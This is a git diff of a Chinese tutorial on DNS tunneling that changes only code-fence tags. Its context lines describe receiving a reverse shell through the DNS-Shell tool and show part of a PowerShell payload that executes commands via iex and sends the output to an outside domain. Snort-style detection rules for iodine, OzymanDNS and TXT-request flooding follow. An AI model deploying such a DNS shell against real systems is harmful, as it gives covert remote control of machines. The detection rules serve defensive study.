@@ -89,7 +89,7 @@ DNS协议报文格式
 我们用到的工具
 [DNS-Shell](https://github.com/sensepost/DNS-Shell)，我们在 CentOS7 上面执行  python DNS-shell.py -l -r test.njcx.bid ，接收由受控机过来的shell，执行后会生成一个 powershell的payload,保存为 ps1 Windows执行即可收到shell
 
-```
+```bash
 $url = "test.njcx.bid";
 function execDNS($cmd) {
 $c = iex $cmd 2>&1 | Out-String;
@@ -158,13 +158,13 @@ shell 如下，
 	
 比如，DNS  TXT请求频率过高，就报警，例子如下
 
-```
+```bash
 alert udp any any -> any 53 (msg:"High TXT requests - Potential DNS Tunneling"; content:"|01 00|"; offset:2; within :4; content:"|00 00 10 00 01|"; offset:12; within:255; threshold: type threshold, track by_src, count 10, seconds 5; sid: 5700002; rev: 1;)
 ```	
 	
 下面，收集了很多知名DNS利用工具的检测规则。
 
-```javascript
+```bash
 alert udp $EXTERNAL_NET 53 -> $HOME_NET any (msg:"APP-DETECT iodine dns tunneling handshake server ACK"; flow:to_client; byte_test:1,&,0x80,2; content:"|00 01 00 01 00|"; depth:5; offset:4; content:"v"; within:1; distance:4; content:"VACK"; within:200; fast_pattern; metadata:service dns; reference:url,code.kryo.se/iodine/README.html; classtype:policy-violation; sid:27046; rev:3;)
 
 alert udp $HOME_NET any -> any 53 (msg:"APP-DETECT OzymanDNS dns tunneling up attempt"; flow:to_server,no_stream; content:"|01 00 00 01 00 00 00 00 00 00|"; depth:10; offset:2; content:"-0"; distance:6; content:"id-"; within:3; distance:1; fast_pattern; content:"up"; within:8; detection_filter:track by_src, count 18, seconds 1; metadata:impact_flag red, service dns; reference:url,dankaminsky.com/2004/07/29/51/; classtype:policy-violation; sid:27540; rev:4;)
